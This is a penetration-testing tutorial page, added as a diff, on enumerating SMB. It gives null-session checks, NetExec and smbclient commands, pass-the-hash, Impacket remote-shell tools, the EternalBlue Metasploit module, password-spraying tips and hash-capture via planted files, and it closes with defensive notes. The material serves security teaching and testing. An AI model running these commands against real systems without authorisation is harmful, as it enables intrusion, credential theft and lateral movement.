@@ -1,0 +1,164 @@
+---
+title: "SMB Enumeration (Server Message Block)"
+---
+
+<Info>
+**What it is**
+
+SMB is the protocol Windows uses for **file and printer sharing** and a huge amount of internal administration. It's reachable on **TCP 445** (and legacy 139) and turns up on the majority of Windows hosts and on Linux via **Samba** (the open-source SMB implementation). It is one of the single most valuable services on an engagement because it exposes file shares (full of configs, scripts, backups, credentials), user/group/policy information, and — with the right access — remote code execution.
+</Info>
+
+---
+
+## How SMB actually works
+
+SMB is a **client-server** protocol. A client (your box, or another Windows machine) connects to a server's TCP **445** and asks to use a **share** — a named, exported folder or resource like `\\SERVER\Finance` or the hidden admin share `\\SERVER\C$`. Everything in SMB hangs off this idea of connecting to a named share and then reading/writing files or calling management functions through it.
+
+A few concepts you need so the rest makes sense:
+
+- **Shares.** A server publishes one or more shares. Some are user-created (`Finance`, `IT`, `devshare`); some are built-in administrative shares ending in `$` (`C$` = the whole C: drive, `ADMIN$` = the Windows folder, `IPC$` = the inter-process communication share). The `$` just means "hidden from casual browsing" — it does **not** mean protected.
+- **IPC$ and named pipes.** `IPC$` is a special share that doesn't hold files; it's the channel used for **remote management calls** (the same MS-RPC functions `rpcclient` uses to list users, groups, and the password policy). This is why connecting to `IPC$` with no credentials — a **null session** — can leak so much.
+- **Ports 139 vs 445.** Modern SMB runs **directly over TCP 445**. The older **139** ran SMB over NetBIOS; you'll still see it on legacy systems. Either open port means SMB is in play.
+- **Dialects (versions).** SMBv1 is ancient and dangerous (it's the version EternalBlue/MS17-010 exploited). SMBv2/v3 are current; v3 adds encryption. The dialect a server still accepts is itself a finding.
+
+<Info>
+**Why SMB is such a high-value target**
+
+Three different wins live behind the same port: (1) **file shares** routinely contain plaintext credentials, configs, private keys, and backups; (2) the **IPC$ / RPC** channel leaks the user list, groups, and password policy you need to spray credentials; and (3) with admin-level credentials, SMB is a direct path to **remote code execution** (PsExec-style). One service, three escalation routes.
+</Info>
+
+---
+
+## Authentication: null sessions, anonymous, and credentialed
+
+How much you can see depends entirely on what you can authenticate as:
+
+- **Null session** — connecting with **no username and no password**. On older/misconfigured Windows and many Samba boxes this is permitted against `IPC$` and lets you enumerate users, groups, shares, and the password policy with **zero credentials**. Microsoft has locked this down over the years, but it persists on legacy hosts and domain controllers with loose settings.
+- **Anonymous / guest** — a blank or `guest` account that may have read access to some shares.
+- **Credentialed** — a real username/password (or an **NT hash**, since SMB supports **Pass-the-Hash**). This is where you can read protected shares and, if the account is a local admin, execute code.
+
+<Tip>
+**The golden rule**
+
+Always try the **null session first** (`-u '' -p ''`), then any guest/anonymous access, then every credential you find — and test each credential against **every host**, because SMB password reuse across a network is rampant.
+</Tip>
+
+---
+
+## How to spot it on a scan
+
+```bash
+nmap -p139,445 -sV -sC <IP>                      # detect SMB + run safe SMB scripts
+nmap -p445 --script smb-os-discovery <IP>        # OS, hostname, domain, SMB dialect
+nmap -p445 --script smb-vuln-* <IP>              # check for EternalBlue (MS17-010) etc.
+```
+
+`smb-os-discovery` is worth running every time — even unauthenticated it gives you the hostname, domain/workgroup, OS build, and whether SMBv1 is enabled.
+
+---
+
+## Enumeration workflow
+
+The goal: list the shares, read everything you're allowed to, and pull the user/group/policy data that feeds password attacks.
+
+### 1. NetExec (nxc) — the workhorse
+
+NetExec (formerly CrackMapExec) speaks SMB and is the fastest way to validate access and enumerate. The same tool checks one host or a whole subnet.
+
+```bash
+nxc smb <IP>                                   # banner: hostname, domain, OS, SMBv1, signing
+nxc smb <IP> -u '' -p ''                       # NULL SESSION — try first
+nxc smb <IP> -u guest -p ''                    # guest/anonymous
+nxc smb <IP> -u <user> -p '<pass>' --shares    # list shares + your READ/WRITE access on each
+nxc smb <IP> -u <user> -p '<pass>' --users     # domain/local users (build a spray list)
+nxc smb <IP> -u <user> -p '<pass>' --pass-pol  # password policy → check lockout BEFORE spraying
+nxc smb <IP> -u <user> -H <NTLM_hash> --shares # Pass-the-Hash instead of a password
+```
+
+<Warning>
+**`Pwn3d!` means local admin**
+
+If `nxc` prints **`(Pwn3d!)`** after a credential, that account is a **local administrator** on the target — you can execute code (see RCE below). Spraying one credential across a `/24` to find every `Pwn3d!` host is a core lateral-movement move.
+</Warning>
+
+### 2. Listing and reading shares
+
+```bash
+smbclient -L //<IP>/ -N                         # -N = no password; list shares via null session
+smbclient //<IP>/<share> -U '<user>%<pass>'     # connect to a share interactively
+#   inside smbclient:  ls / cd <dir> / get <file> / mget * / recurse ON; ls
+smbmap -H <IP> -u <user> -p '<pass>'            # list shares WITH permissions in one view
+smbmap -H <IP> -u <user> -p '<pass>' -R <share> # recurse a share and show the file tree
+```
+
+<Tip>
+**Always `recurse` and read everything**
+
+Credentials hide in the boring files — `web.config`, `*.ps1` scripts, `unattend.xml`, `.kdbx`, `notes.txt`, backups. In smbclient turn on `recurse ON; prompt OFF; mget *` to pull a whole share, then grep it offline.
+</Tip>
+
+### 3. Deep RPC enumeration
+
+For users, groups, and the password policy beyond what nxc shows, drop to RPC over SMB:
+
+```bash
+enum4linux-ng -A <IP>                            # automated all-in-one SMB/RPC enumeration
+rpcclient -U '' -N <IP>                          # manual null-session RPC (see the rpcclient note)
+```
+
+See **[rpcclient Cheat Sheet](/enumeration/rpcclient-cheat-sheet)** for the individual RPC calls (`enumdomusers`, `querygroupmem`, `getdompwinfo`, RID cycling).
+
+---
+
+## From SMB access to remote code execution
+
+If you have credentials for a **local admin** account (the `Pwn3d!` case), SMB becomes a shell. These Impacket tools authenticate over SMB and execute commands as SYSTEM by writing to `ADMIN$` and registering a service or scheduled task:
+
+```bash
+impacket-psexec <user>:'<pass>'@<IP>             # SYSTEM shell (noisiest; drops a service binary)
+impacket-smbexec <user>:'<pass>'@<IP>            # semi-interactive, no binary dropped (quieter)
+impacket-wmiexec <user>:'<pass>'@<IP>            # over WMI, fileless (stealthiest)
+impacket-psexec -hashes :<NTLM_hash> <user>@<IP> # Pass-the-Hash variant
+```
+
+The reason this works: a local admin can write to the hidden `ADMIN$` share and create a service/task that runs as SYSTEM. PsExec automates exactly that, then pipes the output back over a named pipe to fake an interactive shell. See **[Pass the Hash](/password-attacks/pass-the-hash)** for the hash-based workflow these feed into.
+
+<Warning>
+**EternalBlue (MS17-010)**
+
+If `smb-vuln-ms17-010` flags a host, an **unauthenticated** SMBv1 memory-corruption bug gives SYSTEM with no credentials at all. It's the classic "SMBv1 still enabled" finding — exploit via Metasploit's `exploit/windows/smb/ms17_010_eternalblue`.
+</Warning>
+
+---
+
+## What to look for / loot
+
+- **Readable shares** → grep for `password`, `pass`, `cred`, `.config`, `.ps1`, `.kdbx`, `unattend.xml`, private keys.
+- **Writable shares** → plant a payload, or drop an `.scf`/`.lnk` file to capture hashes (forced authentication).
+- **User list** (`--users`) → wordlist for password spraying across SMB/WinRM/RDP.
+- **Password policy** (`--pass-pol`) → lockout threshold, so you spray *one* password across many users instead of locking accounts.
+- **`Pwn3d!` hosts** → local-admin code execution and lateral movement via password reuse.
+
+---
+
+## Defensive notes (for the report)
+
+- **Disable SMBv1 entirely** — it has no safe configuration (EternalBlue, downgrade attacks).
+- **Enable SMB signing** to block NTLM relay attacks.
+- **Disable null/anonymous sessions** (`RestrictAnonymous`/`RestrictNullSessAccess`).
+- Apply **least privilege** to shares (most users don't need write, and few shares need to be world-readable), and rotate any credentials found stored in share contents.
+- Segment SMB with host firewalls so 445 isn't reachable laterally across the whole network.
+
+---
+
+## Quick reference
+
+| Item | Value |
+|---|---|
+| Ports | TCP **445** (modern), **139** (NetBIOS/legacy) |
+| Linux implementation | **Samba** (smbd) |
+| Key shares | `C$`, `ADMIN$` (admin), `IPC$` (RPC/named pipes) |
+| First move | Null session: `nxc smb <IP> -u '' -p ''` and `smbclient -L //<IP>/ -N` |
+| Enum tools | `nxc`, `smbclient`, `smbmap`, `enum4linux-ng`, `rpcclient` |
+| RCE tools | `impacket-psexec` / `smbexec` / `wmiexec`; EternalBlue if SMBv1 |
+| `Pwn3d!` | = local admin → code execution |
